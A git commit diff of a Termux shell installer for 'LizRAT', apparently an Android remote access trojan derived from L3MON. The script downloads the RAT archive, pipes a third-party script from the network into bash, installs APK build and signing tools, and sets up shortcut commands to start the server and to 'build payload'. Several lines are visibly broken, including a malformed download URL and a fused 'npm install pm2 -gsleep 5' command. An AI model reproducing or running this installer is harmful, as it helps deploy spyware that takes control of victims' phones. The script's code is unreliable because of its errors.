680ebc0ea73f27554400f6b708a7c314280b9f48
Nitin.kumar <108232080+Bhartiya-Hacker@users.noreply.github.com>
2023-07-08 03:22:04 +0530

    Update termux_install.sh

--- termux_install.sh
+++ termux_install.sh
@@ -1,67 +1,179 @@
 #!/usr/bin/env sh
 
 # ASCII color codes
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-CYAN='\033[0;36m'
+YLW='\033[1;33m'
+BLU='\033[0;34m'
+CYN='\033[0;36m'
 SAF='\033[38;5;202m'
-WHITE='\033[37m'
+WIT='\033[37m'
+GRN='\033[0;32m'
 NC='\033[0m' # No color
 
+echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
+echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
+echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
+echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
+echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
+echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
+echo "${CYN}                                  By lUCIFER   ${NC}"
+echo "${YLW}Updating system${NC}"
+echo "${GRN}PRESS 'Y' When ASKED then PRESS ENTER${NC}"
+sleep 5
 
-echo "	██╗░░░░░██████╗░███╗░░░███╗░█████╗░███╗░░██╗  ██████╗░░░░░█████╗░
-	██║░░░░░╚════██╗████╗░████║██╔══██╗████╗░██║  ╚════██╗░░░██╔══██╗
-	██║░░░░░░█████╔╝██╔████╔██║██║░░██║██╔██╗██║  ░░███╔═╝░░░██║░░██║
-	██║░░░░░░╚═══██╗██║╚██╔╝██║██║░░██║██║╚████║  ██╔══╝░░░░░██║░░██║
-	███████╗██████╔╝██║░╚═╝░██║╚█████╔╝██║░╚███║  ███████╗██╗╚█████╔╝
-	╚══════╝╚═════╝░╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝  ╚══════╝╚═╝░╚════╝░
-
-echo "${YELLOW}Updating system, PRESS 'Y' When ASKED${NC}"
 pkg update && pkg upgrade
+pkg install wget -y
+clear
 
-if [ -d "$PREFIX/opt" ]; then
-  echo "${GREEN}Directory already exists${NC}"
-else
-  echo "${BLUE}Creating /usr/opt Directory${NC}"
+echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
+echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
+echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
+echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
+echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
+echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
+echo "${CYN}                                  By lUCIFER   ${NC}"
+
+if [ ! -d "$PREFIX/opt" ]; then
+  echo "${BLUE}Setting UP LzRAT${NC}"
   mkdir "$PREFIX/opt"
-  echo "${GREEN}Directory created${NC}"
+  echo "${GREEN}SETUP Complete${NC}"
 fi
+sleep 3
+if [ -d "$PREFIX/opt/lizrat" ]; then
+  echo "${CYAN}Existing lizrat directory Found! Removing it${NC}"
+  rm -rf "$PREFIX/opt/lizrat"
+fi
+sleep 5
 
-echo "${YELLOW}Moving l3mon directory to /usr/opt${NC}"
-mv -r l3mon "$PREFIX/opt"
-echo "${GREEN}l3mon directory Moved${NC}"
+file="lizrat.zip"
 
-echo "${YELLOW}Checking if java, nodejs & npm is installed or not${NC}"
+if [ -e "$file" ]; then
+  echo "${GREEN}File $file exists. NOT Downloading it${NC}"
+else
+  echo "${GREEN}$file does not exist. Downloading...${NC}"
+  wget -q "https:raw.githubusercontent.com/Bhartiya-Hacker/Liz-RAT/master/lizrat.zip" 
+fi
+sleep 5
+
+clear
+echo "${GREEN}Compiling LizRat${NC}"
+sleep 6
+unzip lizrat.zip
+clear
+
+echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
+echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
+echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
+echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
+echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
+echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
+echo "${CYN}                                  By lUCIFER   ${NC}"
+
+echo "${YLW}Setting UP Directories${NC}"
+mv -f lizrat "$PREFIX/opt"
+echo "${GRN}Directory SETUP Complete${NC}"
+sleep 5
+clear
+
+echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
+echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
+echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
+echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
+echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
+echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
+echo "${CYN}                                  By lUCIFER   ${NC}"
+
+echo "${YLW}Checking if java, nodejs & npm is installed or not${NC}"
 if ! command -v java >/dev/null 2>&1 || ! command -v node >/dev/null 2>&1 || ! command -v npm >/dev/null 2>&1; then
-  echo "${CYAN}Packages not found, Installing them${NC}"
+  echo "${CYN}Packages not found, Installing them${NC}"
   pkg install -y openjdk-17 nodejs
 else
-  echo "${CYAN}Packages Found, Removing them${NC}"
+  echo "${CYN}Packages Found, Removing them${NC}"
   pkg remove -y openjdk-17 nodejs
-  echo "${CYAN}Installing packages${NC}"
+  echo "${CYN}Installing packages${NC}"
   pkg install -y openjdk-17 nodejs
 fi
+sleep 3
 
-echo "${YELLOW}Installing pm2${NC}"
-npm install pm2 -g
+clear
 
+echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
+echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
+echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
+echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
+echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
+echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
+echo "${CYN}                                  By lUCIFER   ${NC}"
 
-echo "${YELLOW}Installing apktool, zipalign & apksigner${NC}"
-pkg install -y apksigner 
+echo "${YLW}Installing pm2${NC}"
+npm install pm2 -gsleep 5
+
+echo "${YLW}Installation Complete${NC}"
+
+sleep 5
+
+clear
+
+echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
+echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
+echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
+echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
+echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
+echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
+echo "${CYN}                                  By lUCIFER   ${NC}"
+
+echo "${YLW}Installing apktool, zipalign & apksigner${NC}"
+sleep 5
+
 curl -s https://raw.githubusercontent.com/rendiix/rendiix.github.io/master/install-repo.sh | bash
-apt update
+pkg install -y apksigner 
 pkg install -y apktool zipalign
 
-echo "${YELLOW}Installing Lizrat${NC}"
-pushd "$PREFIX/opt/l3mon" && npm install && popd
+clear
 
-echo "pushd $PREFIX/opt/l3mon && pm2 start index.js && popd" > "$PREFIX/bin/l3mon"
-echo "pushd $PREFIX/opt/l3mon && pm2 stop index.js && popd" > "$PREFIX/bin/l3monx"
-echo "pushd $PREFIX/opt/l3mon && ./builder.sh && popd" > "$PREFIX/bin/l3monb"
+echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
+echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
+echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
+echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
+echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
+echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
+echo "${CYN}                                  By lUCIFER   ${NC}"
 
-chmod +x "$PREFIX/bin/l3mon" "$PREFIX/bin/l3monx" "$PREFIX/bin/l3monb"
+echo "${YLW}Installing Lizrat${NC}"
 
-echo "${GREEN}Installation complete${NC}, ${SAF}Run l3mon by executing l3mon${NC}"
-echo "${CYAN}To build payload execute l3monb${NC}"
-echo "${RED}To stop the Lizrat server execute l3monx${NC}"
+sleep 5
+
+npm install --prefix $PREFIX/opt/lizrat
+
+clear
+
+echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
+echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
+echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
+echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
+echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
+echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
+echo "${CYN}                                  By lUCIFER   ${NC}"
+
+echo "Creating Symlinks"
+sleep 5
+
+echo "pushd $PREFIX/opt/lizrat && pm2 start index.js && popd" > "$PREFIX/bin/liz"
+echo "pushd $PREFIX/opt/lizrat && pm2 stop index.js && popd" > "$PREFIX/bin/lizx"
+echo "pushd $PREFIX/opt/lizrat && ./builder.sh && popd" > "$PREFIX/bin/lizb"
+
+chmod +x "$PREFIX/bin/liz" "$PREFIX/bin/lizx" "$PREFIX/bin/lizb"
+
+clear
+
+echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
+echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
+echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
+echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
+echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
+echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
+echo "${CYN}                                  By lUCIFER   ${NC}"
+
+echo "${GRN}Installation complete${NC}, ${SAF}Run Lizrat from Anywhere in TERMUX by executing 'liz'${NC}"
+echo "${SAf}Please REMOVE 'LizRat Dir' Present at HOME${NC}"
+echo "${CYN}To build payload execute 'lizb' Anywhere in TERMUX${NC}"
+echo "${SAF}To stop the Lizrat server execute 'lizx' Anywhere in TERMUX${NC}"
